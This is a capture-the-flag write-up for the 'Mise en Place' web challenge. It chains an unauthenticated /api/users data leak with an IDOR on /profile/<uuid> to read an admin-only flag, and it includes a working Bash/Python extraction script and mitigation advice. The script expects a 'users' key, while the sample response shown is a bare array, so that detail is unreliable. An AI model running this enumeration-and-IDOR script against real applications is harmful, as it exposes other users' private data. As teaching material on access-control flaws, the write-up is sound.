# Mise en Place — Admin Profile Flag Extraction
 
- Category: Web  
- Difficulty: Easy  

This writeup shows how I solved **Mise en Place** by abusing an unauthenticated user API and direct access to the admin profile, using a small Bash helper script to automatically find the admin UUID and extract the flag.

---

## 1. Challenge Overview

The challenge exposes a Flask-based web application for managing recipes and user profiles.

Key characteristics:

- No traditional login; only passwordless registration for new users.
- Users receive a UUID and a session cookie after registering.
- User profiles are accessible at `/profile/<uuid>`.
- The admin’s profile contains a special “flag-card” where the flag is rendered server-side.

The trick is that the application leaves debug comments in the HTML pointing to internal APIs, and these APIs leak all user data, including the admin’s UUID and role.

---

## 2. Reconnaissance

### 2.1 Tech Stack

A simple HEAD/GET request to `/` shows:

- `Server: gunicorn` — typical Python WSGI server.
- A Flask-style signed session cookie (base64-ish, dot-separated).
- Jinja2-style server-rendered templates (no heavy client-side framework).

So we’re dealing with a Python/Flask app.

### 2.2 Hidden API Endpoints

Viewing the page source reveals HTML comments in the footer such as:

```html
<!-- TODO: Remove API before production -->
<!-- API: /api/users -->
<!-- API: /api/recipes -->
```

These comments expose two undocumented endpoints:

- `/api/users` — returns user data.
- `/api/recipes` — returns recipe data.

For this challenge, `/api/users` is the key.

### 2.3 Registration and Profiles

- The app lets you register with:
  - Username
  - Display name
  - Bio
- No password is required.
- After registration, you get a UUID and a session cookie.
- Profiles are available at `/profile/<uuid>` for any UUID.

We don’t need to register or authenticate; the bug is in how the app exposes and protects data.

---

## 3. Vulnerability: User Enumeration + IDOR

### 3.1 `/api/users` Information Disclosure

Calling `/api/users` returns a JSON array of all registered users, for anyone:

```json
[
  {
    "display_name": "Chef Admin",
    "username": "chef_admin",
    "uuid": "bfd23cc6-7fef-4975-8885-52a558aa779c",
    "role": "admin",
    "bio": "Head chef of the kitchen."
  },
  {
    "display_name": "Test User",
    "username": "testuser",
    "uuid": "a1b2c3d4-...",
    "role": "user",
    "bio": "Just cooking."
  }
]
```

This endpoint:

- Is unauthenticated.
- Leaks sensitive fields (`uuid`, `role`) for all users.
- Immediately reveals who the admin is and their UUID.

This is a classic **information disclosure** / broken data classification issue: internal data is exposed without any access control.

### 3.2 `/profile/<uuid>` Broken Access Control (IDOR)

The profile endpoint:

- Renders a user’s full profile page based only on the UUID in the URL.
- Does not check if the current user is allowed to view that profile.
- Does not require any special role to access the admin profile.

Because the admin’s UUID is leaked via `/api/users`, any user (or even an unauthenticated request) can do:

```bash
curl -s https://INSTANCE.chal.ctf.ae/profile/bfd23cc6-7fef-4975-8885-52a558aa779c
```

The resulting HTML contains:

```html
<div class="flag-card">
  <span class="badge bg-danger">Restricted</span>
  <div class="flag-value">flag{............}</div>
</div>
```

The “Restricted” badge is purely cosmetic; there is no server-side check. This is an **IDOR** (Insecure Direct Object Reference): the app trusts that UUIDs are “secret,” but then exposes them openly.

---

## 4. My Exploit Script

To make the exploitation repeatable and convenient, I wrote a Bash script that:

1. Prompts for the challenge host.
2. Tests connectivity.
3. Downloads `/api/users` JSON.
4. Automatically finds the admin user (by `role` or username).
5. Fetches the admin profile page.
6. Extracts the flag using a regex.

```bash
cat > get_flag.sh <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

echo "[+] Mise en Place CTF - Admin profile flag extractor"
echo

read -rp "Ingresa el host completo, ejemplo https://xxxxx.chal.ctf.ae: " BASE

BASE="${BASE%/}"
COOKIE="$(mktemp)"
USERS_JSON="$(mktemp)"
PROFILE_HTML="$(mktemp)"

cleanup() {
  rm -f "$COOKIE" "$USERS_JSON" "$PROFILE_HTML"
}
trap cleanup EXIT

echo
echo "[+] Host: $BASE"

echo "[+] Probando conexion..."
if ! curl -sk --max-time 10 -c "$COOKIE" -b "$COOKIE" "$BASE/" >/dev/null; then
  echo "[!] No pude conectar al host."
  exit 1
fi

echo "[+] Descargando lista de usuarios desde /api/users..."
curl -sk -c "$COOKIE" -b "$COOKIE" "$BASE/api/users" -o "$USERS_JSON"

if grep -qi '<html' "$USERS_JSON"; then
  echo "[!] /api/users devolvio HTML, no JSON. Revisa el host."
  exit 1
fi

echo "[+] Buscando usuario admin..."

ADMIN_UUID="$(
python3 - "$USERS_JSON" <<'PY'
import json, sys

path = sys.argv[1]

try:
    data = json.load(open(path, "r", encoding="utf-8"))
except Exception as e:
    print("")
    sys.exit()

users = data.get("users", [])

admin = None

for u in users:
    if str(u.get("role", "")).lower() == "admin":
        admin = u
        break

if admin is None:
    for u in users:
        if "admin" in str(u.get("username", "")).lower():
            admin = u
            break

if admin:
    print(admin.get("uuid", ""))
PY
)"

if [ -z "$ADMIN_UUID" ]; then
  echo "[!] No encontre UUID de admin."
  echo "[i] Respuesta de /api/users:"
  cat "$USERS_JSON"
  exit 1
fi

echo "[+] Admin UUID encontrado: $ADMIN_UUID"

echo "[+] Visitando perfil del admin..."
curl -sk -c "$COOKIE" -b "$COOKIE" "$BASE/profile/$ADMIN_UUID" -o "$PROFILE_HTML"

echo "[+] Buscando flag..."
FLAG="$(grep -Eo 'flag\{[^}]+\}|ctf\{[^}]+\}|[A-Z0-9_]+\{[^}]+\}' "$PROFILE_HTML" | head -n 1 || true)"

if [ -n "$FLAG" ]; then
  echo
  echo "[+] FLAG ENCONTRADA:"
  echo "$FLAG"
  exit 0
fi

echo "[!] No encontre flag con regex comun."
echo "[i] Mostrando lineas interesantes:"
grep -iE 'flag|secret|admin|restricted|private|hidden' "$PROFILE_HTML" || true
exit 1
EOF

chmod +x get_flag.sh
./get_flag.sh
```

### Script Behavior

- **Input**: It asks for the full host (e.g. `https://INSTANCE.chal.ctf.ae`).
- **Session handling**: Uses temporary cookie files to preserve any session state set by the server.
- **API usage**:
  - Downloads `/api/users` and checks that it’s JSON, not an error HTML.
  - Uses a Python helper to:
    - Look for a user with `role == "admin"`.
    - If not found, fall back to any username containing `"admin"` (for robustness).
- **Profile access**: Requests `/profile/<ADMIN_UUID>` directly.
- **Flag extraction**:
  - Uses a regex to match typical flag formats: `flag{...}`, `ctf{...}`, or `SOMEFORMAT{...}`.
  - Falls back to printing lines containing interesting keywords if no flag is found.

In the official instance, the regex finds:

```text
flag{...............}
```

---

## 5. Vulnerability Analysis

### Root Cause 1: Unauthenticated `/api/users`

The `/api/users` endpoint:

- Returns all user data to anyone.
- Includes `uuid` and `role` — both sensitive.
- Has no authentication or authorization checks.

Impact:

- Makes UUIDs and roles trivially discoverable.
- Breaks the assumption that UUIDs are “unguessable secrets.”

### Root Cause 2: IDOR on `/profile/<uuid>`

The profile endpoint:

- Accepts any UUID.
- Does not verify if the caller is that user or an admin.
- Renders sensitive data (flag card) based solely on the UUID.

Together, this is a classic chain:

1. **Information disclosure** via debug API.
2. **Insecure Direct Object Reference** via unprotected profile access.

The “Restricted” badge in the flag card is just HTML; real access control must be implemented server-side.

---

## 6. Mitigation & Lessons

### How to Fix

- `/api/users`:
  - Require authentication.
  - Restrict access to admin users only.
  - Remove or minimize sensitive fields (e.g., don’t expose `uuid` and `role` to regular users).

- `/profile/<uuid>`:
  - Enforce server-side authorization:
    - Only allow a user to view their own profile.
    - Or allow admins to view others.
  - Do not render the flag to non-admin users, regardless of URL.

- HTML comments:
  - Strip debug comments in production.
  - Avoid leaking internal API paths via comments.

### Key Takeaways

- Do not rely on **security through obscurity** (unguessable UUIDs) if you’re also exposing them through APIs.
- Always enforce **server-side access control** for sensitive resources.
- Debug endpoints and comments must be removed or locked down before deployment.
- A single unsecured API plus an IDOR can turn an “Easy” challenge into a practical lesson in real-world access control failures.
